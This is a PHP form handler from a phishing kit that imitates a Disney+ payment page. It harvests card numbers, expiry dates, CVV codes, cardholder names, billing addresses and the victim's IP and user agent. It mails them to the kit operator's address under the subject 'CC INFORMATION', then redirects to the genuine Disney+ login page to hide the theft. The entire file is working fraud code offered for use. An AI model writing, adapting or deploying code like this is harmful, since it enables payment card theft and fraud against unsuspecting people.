<?php
session_start();

include './settings.php';

if (isset($_POST['submit'])) {

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
    $message = "";
	$message .= "|👽----------| PERSONAL INFO |--------------👽|\n";
	$message .= "CardNumber   : ".$_POST['cardNumber']."\n";
	$message .= "EXP MM       : ".$_POST['cardExpiryDate']."\n";
	$message .= "EXP YY   	  : ".$_POST['cardExpiryDate1']."\n";
	$message .= "CVV          : ".$_POST['securityCode']."\n";
	$message .= "FullName     : ".$_POST['cardHolderName']."\n";
    $message .= "|-------👽-------- Billing Info ---------👽----------|\n";
    $message .= "Street      	  : ".$_POST['addrLine1']."\n";
    $message .= "apt    		  : ".$_POST['addrLine2']."\n";
    $message .= "City   		  : ".$_POST['city']."\n";
    $message .= "State        	  : ".$_POST['state']."\n";
    $message .= "Zipcode          : ".$_POST['postalCode']."\n";
	$message .= "|-------👽-------- I N F O | I P ---------👽----------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|-----------👽Designed By Akira👽--------------|\n";
	$send = $Receive_email;
	$subject = "👽CC INFORMATION👽 : $ip";
	mail($send, $subject, $message); 
	
	header("Location: https://www.disneyplus.com/login");
    exit();
}
else{
    header("Location: ./index.php");
    exit();
}